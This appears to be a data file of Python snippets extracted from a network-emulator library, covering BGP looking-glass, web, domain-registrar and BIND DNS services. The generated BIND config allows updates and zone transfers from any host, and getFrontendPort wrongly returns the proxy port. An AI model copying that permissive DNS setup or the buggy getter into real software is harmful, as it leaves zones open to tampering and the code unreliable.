  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DHCPServiceLayer\\n'\n\n        return out",
  "class BgpLookingGlassServer(Server):\n    \"\"\"!\n    @brief the BGP looking glass server. A looking glass server has two parts,\n    proxy and frontend. Proxy runs on routers and talk with BIRD to get routing\n    information, and frontend is the actual \"looking glass\" page.\n    \"\"\"\n\n    __routers: Set[str]\n    __sim: Emulator\n    __frontend_port: int\n    __proxy_port: int\n\n    def __init__(self):\n        \"\"\"!\n        @brief create a new class BgpLookingGlassServer.\n        \"\"\"\n        super().__init__()\n        self.__routers = set()\n        self.__frontend_port = 5000\n        self.__proxy_port = 8000\n\n    def __installLookingGlass(self, node: Node):\n        \"\"\"!\n        @brief add commands for installing looking glass to nodes.\n\n        @param node node.\n        \"\"\"\n\n        # note: need golang 1.12+; ubuntu defaults to 1.13. need attention if using debian\n        node.addSoftware('golang')\n        node.addSoftware('git')\n        node.addSoftware('make')\n        node.addBuildCommand('git clone https://github.com/xddxdd/bird-lg-go /lg')\n        node.addBuildCommand('curl -Lo /bin/go-bindata https://github.com/kevinburke/go-bindata/releases/download/v3.11.0/go-bindata-linux-amd64')\n        node.addBuildCommand('chmod +x /bin/go-bindata')\n        node.addBuildCommand('make -C /lg')\n\n    def setFrontendPort(self, port: int) -> BgpLookingGlassServer:\n        \"\"\"!\n        @brief set frontend port for looking glass. (default: 5000)\n\n        @param port port\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__frontend_port = port\n\n        return self\n\n    def getFrontendPort(self) -> int:\n        \"\"\"!\n        @brief get frontend port.\n\n        @returns frontend port.\n        \"\"\"\n        return self.__proxy_port\n\n    def setProxyPort(self, port: int) -> BgpLookingGlassServer:\n        \"\"\"!\n        @brief set proxy port for looking glass. (default: 8000)\n\n        @param port port\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__proxy_port = port\n\n        return self\n\n    def getProxyPort(self) -> int:\n        \"\"\"!\n        @brief get proxy port.\n\n        @returns proxy port.\n        \"\"\"\n        return self.__proxy_port\n\n    def attach(self, routerName: str) -> BgpLookingGlassServer:\n        \"\"\"!\n        @brief add looking glass node on the router identified by given name.\n\n        @param routerName name of the router\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__routers.add(routerName)\n\n        return self\n\n        return self\n\n    def getAttached(self) -> Set[str]:\n        \"\"\"!\n        @brief get routers to be attached.\n\n        @return set of router names.\n        \"\"\"\n        return self.__routers\n\n    def bind(self, emulator: Emulator):\n        \"\"\"!\n        @brief bind to the given emulator object; this will be called by the\n        BgpLookingGlassService during the render-config stage. This will be used\n        to search for router nodes during installation.\n\n        @param emulator emulator object.\n        \"\"\"\n        self.__sim = emulator\n\n    def install(self, node: Node):\n        routers: Dict[str, str] = {}\n        asn = node.getAsn()\n        sreg = ScopedRegistry(str(asn), self.__sim.getRegistry())\n\n        self.__installLookingGlass(node)\n\n        for obj in sreg.getByType('rnode'):\n            router: Router = obj\n            \n            if router.getName() not in self.__routers: continue\n\n            _node: Node = router.getAttribute('__looking_glass_node', node)\n\n            assert _node == node, 'router as{}/{} already attached to another looking glass node (as{}/{})'.format(\n                router.getAsn(), router.getName(), _node.getAsn(), _node.getName()\n            )\n\n            self.__installLookingGlass(router)\n\n            router.appendStartCommand('while [ ! -e \"{}\" ]; do echo \"lg: waiting for bird...\";  sleep 1; done'.format(\n                BIRDCTRL\n            ))\n            \n            router.appendStartCommand('/lg/proxy/proxy --bird \"{}\" --listen :{}'.format(\n                BIRDCTRL, self.__proxy_port\n            ), True)\n\n            routers[router.getName()] = router.getLoopbackAddress()\n\n        for (router, address) in routers.items():\n            node.appendStartCommand('echo \"{} {}.lg.as{}.net\" >> /etc/hosts'.format(address, router, asn))\n\n        node.appendStartCommand('/lg/frontend/frontend -domain lg.as{}.net --servers {} --proxy-port {} --listen :{} --title-brand \"{}\" --navbar-brand \"{}\"'.format(\n            asn, ','.join(routers.keys()), self.__proxy_port, self.__frontend_port, 'AS{} looking glass'.format(asn), 'AS{} looking glass'.format(asn)\n        ))",
  "class BgpLookingGlassService(Service):\n    \"\"\"!\n    @brief the BGP looking glass service.\n    \"\"\"\n\n    __emulator: Emulator\n\n    def __init__(self):\n        super().__init__()\n        self.addDependency('Routing', False, False)\n\n    def _createServer(self) -> Server:\n        return BgpLookingGlassServer()\n\n    def _doConfigure(self, node: Node, server: BgpLookingGlassServer):\n        super()._doConfigure(node, server)\n        server.bind(self.__emulator)\n\n    def configure(self, emulator: Emulator):\n        self.__emulator = emulator\n        return super().configure(emulator)\n\n    def getName(self) -> str:\n        return 'BgpLookingGlassService'\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BgpLookingGlassServiceLayer\\n'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief create a new class BgpLookingGlassServer.\n        \"\"\"\n        super().__init__()\n        self.__routers = set()\n        self.__frontend_port = 5000\n        self.__proxy_port = 8000",
  "def __installLookingGlass(self, node: Node):\n        \"\"\"!\n        @brief add commands for installing looking glass to nodes.\n\n        @param node node.\n        \"\"\"\n\n        # note: need golang 1.12+; ubuntu defaults to 1.13. need attention if using debian\n        node.addSoftware('golang')\n        node.addSoftware('git')\n        node.addSoftware('make')\n        node.addBuildCommand('git clone https://github.com/xddxdd/bird-lg-go /lg')\n        node.addBuildCommand('curl -Lo /bin/go-bindata https://github.com/kevinburke/go-bindata/releases/download/v3.11.0/go-bindata-linux-amd64')\n        node.addBuildCommand('chmod +x /bin/go-bindata')\n        node.addBuildCommand('make -C /lg')",
  "def setFrontendPort(self, port: int) -> BgpLookingGlassServer:\n        \"\"\"!\n        @brief set frontend port for looking glass. (default: 5000)\n\n        @param port port\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__frontend_port = port\n\n        return self",
  "def getFrontendPort(self) -> int:\n        \"\"\"!\n        @brief get frontend port.\n\n        @returns frontend port.\n        \"\"\"\n        return self.__proxy_port",
  "def setProxyPort(self, port: int) -> BgpLookingGlassServer:\n        \"\"\"!\n        @brief set proxy port for looking glass. (default: 8000)\n\n        @param port port\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__proxy_port = port\n\n        return self",
  "def getProxyPort(self) -> int:\n        \"\"\"!\n        @brief get proxy port.\n\n        @returns proxy port.\n        \"\"\"\n        return self.__proxy_port",
  "def attach(self, routerName: str) -> BgpLookingGlassServer:\n        \"\"\"!\n        @brief add looking glass node on the router identified by given name.\n\n        @param routerName name of the router\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__routers.add(routerName)\n\n        return self\n\n        return self",
  "def getAttached(self) -> Set[str]:\n        \"\"\"!\n        @brief get routers to be attached.\n\n        @return set of router names.\n        \"\"\"\n        return self.__routers",
  "def bind(self, emulator: Emulator):\n        \"\"\"!\n        @brief bind to the given emulator object; this will be called by the\n        BgpLookingGlassService during the render-config stage. This will be used\n        to search for router nodes during installation.\n\n        @param emulator emulator object.\n        \"\"\"\n        self.__sim = emulator",
  "def install(self, node: Node):\n        routers: Dict[str, str] = {}\n        asn = node.getAsn()\n        sreg = ScopedRegistry(str(asn), self.__sim.getRegistry())\n\n        self.__installLookingGlass(node)\n\n        for obj in sreg.getByType('rnode'):\n            router: Router = obj\n            \n            if router.getName() not in self.__routers: continue\n\n            _node: Node = router.getAttribute('__looking_glass_node', node)\n\n            assert _node == node, 'router as{}/{} already attached to another looking glass node (as{}/{})'.format(\n                router.getAsn(), router.getName(), _node.getAsn(), _node.getName()\n            )\n\n            self.__installLookingGlass(router)\n\n            router.appendStartCommand('while [ ! -e \"{}\" ]; do echo \"lg: waiting for bird...\";  sleep 1; done'.format(\n                BIRDCTRL\n            ))\n            \n            router.appendStartCommand('/lg/proxy/proxy --bird \"{}\" --listen :{}'.format(\n                BIRDCTRL, self.__proxy_port\n            ), True)\n\n            routers[router.getName()] = router.getLoopbackAddress()\n\n        for (router, address) in routers.items():\n            node.appendStartCommand('echo \"{} {}.lg.as{}.net\" >> /etc/hosts'.format(address, router, asn))\n\n        node.appendStartCommand('/lg/frontend/frontend -domain lg.as{}.net --servers {} --proxy-port {} --listen :{} --title-brand \"{}\" --navbar-brand \"{}\"'.format(\n            asn, ','.join(routers.keys()), self.__proxy_port, self.__frontend_port, 'AS{} looking glass'.format(asn), 'AS{} looking glass'.format(asn)\n        ))",
  "def __init__(self):\n        super().__init__()\n        self.addDependency('Routing', False, False)",
  "def _createServer(self) -> Server:\n        return BgpLookingGlassServer()",
  "def _doConfigure(self, node: Node, server: BgpLookingGlassServer):\n        super()._doConfigure(node, server)\n        server.bind(self.__emulator)",
  "def configure(self, emulator: Emulator):\n        self.__emulator = emulator\n        return super().configure(emulator)",
  "def getName(self) -> str:\n        return 'BgpLookingGlassService'",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BgpLookingGlassServiceLayer\\n'\n\n        return out",
  "class WebServer(Server):\n    \"\"\"!\n    @brief The WebServer class.\n    \"\"\"\n\n    __port: int\n    __index: str\n\n    def __init__(self):\n        \"\"\"!\n        @brief WebServer constructor.\n        \"\"\"\n        super().__init__()\n\n        self.__port = 80\n        self.__index = '<h1>{nodeName} at {asn}</h1>'\n        \n\n    def setPort(self, port: int) -> WebServer:\n        \"\"\"!\n        @brief Set HTTP port.\n\n        @param port port.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__port = port\n\n        return self\n\n    def setIndexContent(self, content: str) -> WebServer:\n        \"\"\"!\n        @brief Set content of index.html.\n\n        @param content content. {nodeName} and {asn} are available and will be\n        filled in.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__index = content\n\n        return self\n    \n    def install(self, node: Node):\n        \"\"\"!\n        @brief Install the service.\n        \"\"\"\n        node.addSoftware('nginx-light')\n        node.setFile('/var/www/html/index.html', self.__index.format(asn = node.getAsn(), nodeName = node.getName()))\n        node.setFile('/etc/nginx/sites-available/default', WebServerFileTemplates['nginx_site'].format(port = self.__port))\n        node.appendStartCommand('service nginx start')\n        node.appendClassName(\"WebService\")\n        \n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Web server object.\\n'\n\n        return out",
  "class WebService(Service):\n    \"\"\"!\n    @brief The WebService class.\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief WebService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)\n\n    def _createServer(self) -> Server:\n        return WebServer()\n\n    def getName(self) -> str:\n        return 'WebService'\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'WebServiceLayer\\n'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief WebServer constructor.\n        \"\"\"\n        super().__init__()\n\n        self.__port = 80\n        self.__index = '<h1>{nodeName} at {asn}</h1>'",
  "def setPort(self, port: int) -> WebServer:\n        \"\"\"!\n        @brief Set HTTP port.\n\n        @param port port.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__port = port\n\n        return self",
  "def setIndexContent(self, content: str) -> WebServer:\n        \"\"\"!\n        @brief Set content of index.html.\n\n        @param content content. {nodeName} and {asn} are available and will be\n        filled in.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__index = content\n\n        return self",
  "def install(self, node: Node):\n        \"\"\"!\n        @brief Install the service.\n        \"\"\"\n        node.addSoftware('nginx-light')\n        node.setFile('/var/www/html/index.html', self.__index.format(asn = node.getAsn(), nodeName = node.getName()))\n        node.setFile('/etc/nginx/sites-available/default', WebServerFileTemplates['nginx_site'].format(port = self.__port))\n        node.appendStartCommand('service nginx start')\n        node.appendClassName(\"WebService\")",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Web server object.\\n'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief WebService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)",
  "def _createServer(self) -> Server:\n        return WebServer()",
  "def getName(self) -> str:\n        return 'WebService'",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'WebServiceLayer\\n'\n\n        return out",
  "class DomainRegistrarServer(Server):\n    \"\"\"!\n    @brief The DomainRegistrarServer class.\n\n    FIXME requires internet to work. what if the emulation is not connected to the internet.\n    FIXME need to work on non-TLD server. consider nsupdate and use some sort of way to \"attach\" to TLD servers.\n    FIXME don't install this on TLD server. see last FIXME too.\n    \"\"\"\n\n    __port: int\n\n    def __init__(self):\n        \"\"\"!\n        @brief DomainRegistrarServer constructor.\n        \"\"\"\n        super().__init__()\n\n        self.__port = 80\n\n    def setPort(self, port: int):\n        \"\"\"!\n        @brief Set HTTP port.\n\n        @param port port.\n        \"\"\"\n        ## ! todo\n        self.__port = port\n\n    def install(self, node: Node):\n        \"\"\"!\n        @brief Install the service.\n        \"\"\"\n        node.addSoftware('nginx-light php7.4-fpm') # Install nginx and php\n        node.setFile('/var/www/html/index.php', DomainRegistrarServerFileTemplates['web_app_file']) #index page for domain register service\n        node.setFile('/var/www/html/domain.php', DomainRegistrarServerFileTemplates['web_app_file2']) # domain names register page.\n        node.setFile('/etc/nginx/sites-available/default', DomainRegistrarServerFileTemplates['nginx_site'].format(port = self.__port)) # setup nginx\n        node.appendStartCommand('service nginx start')\n        node.appendStartCommand('service php7.4-fpm start')\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DomainRegistrarServer\\n'\n\n        return out",
  "class DomainRegistrarService(Service):\n    \"\"\"!\n    @brief The DomainRegistrarService class.\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief DomainRegistrarService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)\n\n    def getName(self) -> str:\n        return 'DomainRegistrarService'\n\n    def _createServer(self) -> DomainRegistrarServer:\n        return DomainRegistrarServer()\n\n    def _doConfigure(self, node: Node, server: Server):\n        # In order to identify if the target node has DomainNameService.\n        assert \"DomainNameService\" in node.getAttribute('services') , 'DomainNameService required on node to use DomainRegistrarService.'\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DomainRegistrarService\\n'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief DomainRegistrarServer constructor.\n        \"\"\"\n        super().__init__()\n\n        self.__port = 80",
  "def setPort(self, port: int):\n        \"\"\"!\n        @brief Set HTTP port.\n\n        @param port port.\n        \"\"\"\n        ## ! todo\n        self.__port = port",
  "def install(self, node: Node):\n        \"\"\"!\n        @brief Install the service.\n        \"\"\"\n        node.addSoftware('nginx-light php7.4-fpm') # Install nginx and php\n        node.setFile('/var/www/html/index.php', DomainRegistrarServerFileTemplates['web_app_file']) #index page for domain register service\n        node.setFile('/var/www/html/domain.php', DomainRegistrarServerFileTemplates['web_app_file2']) # domain names register page.\n        node.setFile('/etc/nginx/sites-available/default', DomainRegistrarServerFileTemplates['nginx_site'].format(port = self.__port)) # setup nginx\n        node.appendStartCommand('service nginx start')\n        node.appendStartCommand('service php7.4-fpm start')",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DomainRegistrarServer\\n'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief DomainRegistrarService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)",
  "def getName(self) -> str:\n        return 'DomainRegistrarService'",
  "def _createServer(self) -> DomainRegistrarServer:\n        return DomainRegistrarServer()",
  "def _doConfigure(self, node: Node, server: Server):\n        # In order to identify if the target node has DomainNameService.\n        assert \"DomainNameService\" in node.getAttribute('services') , 'DomainNameService required on node to use DomainRegistrarService.'",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DomainRegistrarService\\n'\n\n        return out",
  "class Zone(Printable):\n    \"\"\"!\n    @brief Domain name zone.\n    \"\"\"\n    __zonename: str\n    __subzones: Dict[str, Zone]\n    __records: List[str]\n    __gules: List[str]\n    # TODO: maybe make it a Dict[str, List[str]], so a name can point to multiple vnodes?\n    __pending_records: Dict[str, str]\n\n    def __init__(self, name: str):\n        \"\"\"!\n        @brief Zone constructor.\n        \n        @param name full zonename.\n        \"\"\"\n        self.__zonename = name\n        self.__subzones = {}\n        self.__records = [\n            '$TTL 300',\n            '$ORIGIN {}'.format(name if name != '' else '.')\n        ]\n        self.__gules = []\n        self.__pending_records = {}\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get zonename.\n\n        @returns zonename.\n        \"\"\"\n        return self.__zonename\n\n    def getSubZone(self, name: str) -> Zone:\n        \"\"\"!\n        @brief Get a subzone, if not exists, a new one will be created.\n\n        @param name partial zonename. For example, if current zone is \"com.\", to\n        get \"example.com.\", use getSubZone(\"example\")\n\n        @returns zone.\n        @throws AssertionError if invalid zonename.\n        \"\"\"\n        assert '.' not in name, 'invalid subzone name \"{}\"'.format(name)\n        if name in self.__subzones: return self.__subzones[name]\n        self.__subzones[name] = Zone('{}.{}'.format(name, self.__zonename if self.__zonename != '.' else ''))\n        return self.__subzones[name]\n    \n    def getSubZones(self) -> Dict[str, Zone]:\n        \"\"\"!\n        @brief Get all subzones.\n\n        @return subzones dict.\n        \"\"\"\n        return self.__subzones\n\n    def addRecord(self, record: str) -> Zone:\n        \"\"\"!\n        @brief Add a new record to zone.\n\n        @todo NS?\n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__records.append(record)\n\n        return self\n    \n    def deleteRecord(self, record: str) -> Zone:\n        \"\"\"!\n        @brief Delete the record from zone.\n\n        @todo NS?\n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__records.remove(record)\n\n        return self\n\n    def addGuleRecord(self, fqdn: str, addr: str) -> Zone:\n        \"\"\"!\n        @brief Add a new gule record.\n\n        Use this method to register a name server in the parent zone.\n\n        @param fqdn full domain name of the name server.\n        @param addr IP address of the name server.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        if fqdn[-1] != '.': fqdn += '.'\n        zonename = self.__zonename if self.__zonename != '' else '.' \n        self.__gules.append('{} A {}'.format(fqdn, addr))\n        self.__gules.append('{} NS {}'.format(zonename, fqdn))\n\n        return self\n\n    def resolveTo(self, name: str, node: Node) -> Zone:\n        \"\"\"!\n        @brief Add a new A record, pointing to the given node.\n\n        @param name name.\n        @param node node.\n\n        @throws AssertionError if node does not have valid interfaces.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        address: str = None\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'Node has no interfaces.'\n        for iface in ifaces:\n            net = iface.getNet()\n            if net.getType() == NetworkType.Host or net.getType() == NetworkType.Local:\n                address = iface.getAddress()\n                break\n\n        assert address != None, 'Node has no valid interfaces.'\n        self.__records.append('{} A {}'.format(name, address))\n\n        return self\n\n    def resolveToVnode(self, name: str, vnode: str) -> Zone:\n        \"\"\"!\n        @brief Add a new A record, pointing to the given virtual node name.\n\n        @param name name.\n        @param vnode  virtual node name.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__pending_records[name] = vnode\n\n        return self\n\n    def resolvePendingRecords(self, emulator: Emulator):\n        \"\"\"!\n        @brief resolve pending records in this zone.\n\n        @param emulator emulator object.\n        \"\"\"\n        for (domain_name, vnode_name) in self.__pending_records.items():\n            pnode = emulator.resolvVnode(vnode_name)\n\n            ifaces = pnode.getInterfaces()\n            assert len(ifaces) > 0, 'resolvePendingRecords(): node as{}/{} has no interfaces'.format(pnode.getAsn(), pnode.getName())\n            addr = ifaces[0].getAddress()\n\n            self.addRecord('{} A {}'.format(domain_name, addr))\n\n    def getPendingRecords(self) -> Dict[str, str]:\n        \"\"\"!\n        @brief Get pending records.\n\n        @returns dict, where key is domain name, and value is vnode name.\n        \"\"\"\n        return self.__pending_records\n\n    def getRecords(self) -> List[str]:\n        \"\"\"!\n        @brief Get all records.\n\n        @return list of records.\n        \"\"\"\n        return self.__records\n\n    def getGuleRecords(self) -> List[str]:\n        \"\"\"!\n        @brief Get all gule records.\n\n        @return list of records.\n        \"\"\"\n        return self.__gules\n\n    def findRecords(self, keyword: str) -> List[str]:\n        \"\"\"!\n        @brief Find a record.\n\n        @param keyword keyword.\n\n        @return list of records.\n        \"\"\"\n        return [ r for r in self.__records if keyword in r ]\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        zonename = self.__zonename if self.__zonename != '' else '(root zone)'\n        out += 'Zone \"{}\":\\n'.format(zonename)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Zonefile:\\n'\n\n        indent += 4\n        for record in self.__records:\n            out += ' ' * indent\n            out += '{}\\n'.format(record)\n\n        indent -= 4\n        out += ' ' * indent\n        out += 'Subzones:\\n'\n        \n        indent += 4\n        for subzone in self.__subzones.values():\n            out += subzone.print(indent)\n\n        return out",
  "class DomainNameServer(Server):\n    \"\"\"!\n    @brief The domain name server.\n    \"\"\"\n\n    __zones: Set[Tuple[str, bool]]\n    __node: Node\n    __is_master: bool\n    __is_real_root: bool\n\n    def __init__(self):\n        \"\"\"!\n        @brief DomainNameServer constructor.\n        \"\"\"\n        super().__init__()\n        \n        self.__zones = set()\n        self.__is_master = False\n        self.__is_real_root = False\n\n    def addZone(self, zonename: str, createNsAndSoa: bool = True) -> DomainNameServer:\n        \"\"\"!\n        @brief Add a zone to this node.\n\n        @param zonename name of zone to host.\n        @param createNsAndSoa add NS and SOA (if doesn't already exist) to zone. \n\n        You should use DomainNameService.hostZoneOn to host zone on node if you\n        want the automated NS record to work.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__zones.add((zonename, createNsAndSoa))\n\n        return self\n\n    def setMaster(self) -> DomainNameServer:\n        \"\"\"!\n        @brief set the name server to be master name server.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__is_master = True\n\n        return self\n\n    def setRealRootNS(self) -> DomainNameServer:\n        \"\"\"!\n        @brief set the name server to be a real root name server.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__is_real_root = True\n\n        return self\n\n    def getNode(self) -> Node:\n        \"\"\"!\n        @brief get node associated with the server. Note that this only works\n        after the services is configured.\n        \"\"\"\n        return self.__node\n\n    def getZones(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of zones hosted on the node.\n\n        @returns list of zones.\n        \"\"\"\n        zones = []\n        for (z, _) in self.__zones: zones.append(z)\n        return zones\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        (scope, _, name) = self.__node.getRegistryInfo()\n        out += 'Zones on as{}/{}:\\n'.format(scope, name)\n        indent += 4\n        for (zone, _) in self.__zones:\n            out += ' ' * indent\n            if zone == '' or zone[-1] != '.': zone += '.'\n            out += '{}\\n'.format(zone)\n\n        return out\n\n        \n    def __getRealRootRecords(self):\n        \"\"\"!\n        @brief Helper tool, get real-world root zone records list by\n        RIPE RIS.\n\n        @throw AssertionError if API failed.\n        \"\"\"\n        rules = []\n        rslt = requests.get(ROOT_ZONE_URL)\n\n        assert rslt.status_code == 200, 'RIPEstat API returned non-200'\n        \n        rules_byte = rslt.iter_lines()\n        \n        for rule_byte in rules_byte:\n            line_str:str = rule_byte.decode('utf-8')\n            if not line_str.startswith('.'):\n                rules.append(line_str)\n        \n        return rules\n\n\n    def configure(self, node: Node, dns: DomainNameService):\n        \"\"\"!\n        @brief configure the node.\n        \"\"\"\n        self.__node = node\n\n        for (_zonename, auto_ns_soa) in self.__zones:\n            zone = dns.getZone(_zonename)\n            zonename = zone.getName()\n\n            if auto_ns_soa:\n                ifaces = node.getInterfaces()\n                assert len(ifaces) > 0, 'node has not interfaces'\n                addr = ifaces[0].getAddress()\n\n                if self.__is_master:\n                    dns.addMasterIp(zonename, str(addr))\n\n                if zonename[-1] != '.': zonename += '.'\n                if zonename == '.': zonename = ''\n\n                if len(zone.findRecords('SOA')) == 0:\n                    zone.addRecord('@ SOA {} {} {} 900 900 1800 60'.format('ns1.{}'.format(zonename), 'admin.{}'.format(zonename), randint(1, 0xffffffff)))\n\n                #If there are multiple zone servers, increase the NS number for ns name.\n                ns_number = 1\n                while (True):\n                    if len(zone.findRecords('ns{}.{} A '.format(str(ns_number), zonename))) > 0:\n                        ns_number +=1\n                    else:\n                        break\n\n                zone.addGuleRecord('ns{}.{}'.format(str(ns_number), zonename), addr)\n                zone.addRecord('ns{}.{} A {}'.format(str(ns_number), zonename, addr))\n                zone.addRecord('@ NS ns{}.{}'.format(str(ns_number), zonename))\n                \n            if zone.getName() == \".\" and self.__is_real_root:\n                for record in self.__getRealRootRecords():\n                    zone.addRecord(record)\n\n    def install(self, node: Node, dns: DomainNameService):\n        \"\"\"!\n        @brief Handle the installation.\n        \"\"\"\n        assert node == self.__node, 'configured node differs from install node. Please check if there are conflict bindings'\n\n        node.addSoftware('bind9')\n        node.appendStartCommand('echo \"include \\\\\"/etc/bind/named.conf.zones\\\\\";\" >> /etc/bind/named.conf.local')\n        node.setFile('/etc/bind/named.conf.options', DomainNameServiceFileTemplates['named_options'])\n        node.setFile('/etc/bind/named.conf.zones', '')\n\n        for (_zonename, auto_ns_soa) in self.__zones:\n            zone = dns.getZone(_zonename)\n            zonename = filename = zone.getName()\n\n            if zonename == '' or zonename == '.':\n                filename = 'root'\n                zonename = '.'\n            zonepath = '/etc/bind/zones/{}'.format(filename)\n            node.setFile(zonepath, '\\n'.join(zone.getRecords()))\n\n            if self.__is_master:\n                node.appendFile('/etc/bind/named.conf.zones',\n                        'zone \"{}\" {{ type master; notify yes; allow-transfer {{ any; }}; file \"{}\"; allow-update {{ any; }}; }};\\n'.format(zonename, zonepath)\n                    )\n            elif zone.getName() in dns.getMasterIp().keys(): # Check if there are some master servers\n                master_ips = ';'.join(dns.getMasterIp()[zone.getName()])\n                node.appendFile('/etc/bind/named.conf.zones',\n                    'zone \"{}\" {{ type slave; masters {{ {}; }}; file \"{}\"; }};\\n'.format(zonename, master_ips, zonepath)\n                )\n            else:\n                node.appendFile('/etc/bind/named.conf.zones',\n                    'zone \"{}\" {{ type master; file \"{}\"; allow-update {{ any; }}; }};\\n'.format(zonename, zonepath)\n                )\n\n        node.appendStartCommand('chown -R bind:bind /etc/bind/zones')\n        node.appendStartCommand('service named start')",
  "class DomainNameService(Service):\n    \"\"\"!\n    @brief The domain name service.\n    \"\"\"\n\n    __rootZone: Zone\n    __autoNs: bool\n    __masters: Dict [str, List[str]]\n\n    def __init__(self, autoNameServer: bool = True):\n        \"\"\"!\n        @brief DomainNameService constructor.\n        \n        @param autoNameServer add gule records to parents automatically.\n        \"\"\"\n        super().__init__()\n        self.__autoNs = autoNameServer\n        self.__rootZone = Zone('.')\n        self.__masters = {}\n        self.addDependency('Base', False, False)\n    \n    def __autoNameServer(self, zone: Zone):\n        \"\"\"!\n        @brief Try to automatically add NS records of children to parent zones.\n\n        @param zone root zone reference.\n        \"\"\"\n        if (len(zone.getSubZones().values()) == 0): return\n        self._log('Collecting subzones NSes of \"{}\"...'.format(zone.getName()))\n        for subzone in zone.getSubZones().values():\n            for gule in subzone.getGuleRecords(): zone.addRecord(gule)\n            self.__autoNameServer(subzone)\n\n    def __resolvePendingRecords(self, emulator: Emulator, zone: Zone):\n        zone.resolvePendingRecords(emulator)\n        self._log('resloving pending records for zone \"{}\"...'.format(zone.getName()))\n        for subzone in zone.getSubZones().values():\n            self.__resolvePendingRecords(emulator, subzone)\n\n    def _createServer(self) -> Server:\n        return DomainNameServer()\n\n    def _doConfigure(self, node: Node, server: DomainNameServer):\n        server.configure(node, self)\n\n    def configure(self, emulator: Emulator):\n        self.__resolvePendingRecords(emulator, self.__rootZone)\n        return super().configure(emulator)\n\n    def _doInstall(self, node: Node, server: DomainNameServer):\n        server.install(node, self)\n\n    def getName(self):\n        return 'DomainNameService'\n\n    def getConflicts(self) -> List[str]:\n        return ['DomainNameCachingService']\n    \n    def getZone(self, domain: str) -> Zone:\n        \"\"\"!\n        @brief Get a zone, create it if not exist.\n\n        This method only create the zone. Host it with hostZoneOn.\n\n        @param domain zone name.\n\n        @returns zone handler.\n        \"\"\"\n        if domain == '.' or domain == '': return self.__rootZone\n        path: List[str] = sub(r'\\.$', '', domain).split('.')\n        path.reverse()\n        zoneptr = self.__rootZone\n        for z in path:\n            zoneptr = zoneptr.getSubZone(z)\n\n        return zoneptr\n\n    def getRootZone(self) -> Zone:\n        \"\"\"!\n        @brief Get the root zone.\n\n        @return root zone.\n        \"\"\"\n        return self.__rootZone\n\n    def getZoneServerNames(self, domain: str) -> List[str]:\n        \"\"\"!\n        @brief Get the names of servers hosting the given zone. This only works\n        if the server was installed by using the \"installByName\" call.\n\n        @param domain domain.\n\n        @returns list of tuple of (node name, asn)\n        \"\"\"\n        info = []\n        targets = self.getPendingTargets()\n\n        for (vnode, sobj) in targets.items():\n            server: DomainNameServer = sobj\n\n            hit = False\n\n            for zone in server.getZones():\n                if zone.getName() == domain:\n                    info.append(vnode)\n                    hit = True\n                    break\n            \n            if hit: continue\n        \n        return info\n\n    def addMasterIp(self, zone: str, addr: str) -> DomainNameService:\n        \"\"\"!\n        @brief add master name server IP address.\n\n        @param addr the IP address of master zone server.\n        @param zone the zone name, e.g : com.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        if zone in self.__masters.keys():\n            self.__masters[zone].append(addr)\n        else:\n            self.__masters[zone] = [addr]\n\n        return self\n\n    def setAllMasterIp(self, masters: Dict[str: List[str]]):\n        \"\"\"!\n        @brief override all master IPs, to be used for merger. Do not use unless\n        you know what you are doing.\n\n        @param masters master dict.\n        \"\"\"\n        self.__masters = masters\n\n    def getMasterIp(self) -> Dict [str, List[str]]:\n        \"\"\"!\n        @brief get all master name server IP address.\n\n        @return list of ip address\n        \"\"\"\n        return self.__masters\n\n    def render(self, emulator: Emulator):\n        if self.__autoNs:\n            self._log('Setting up NS records...')\n            self.__autoNameServer(self.__rootZone)\n\n        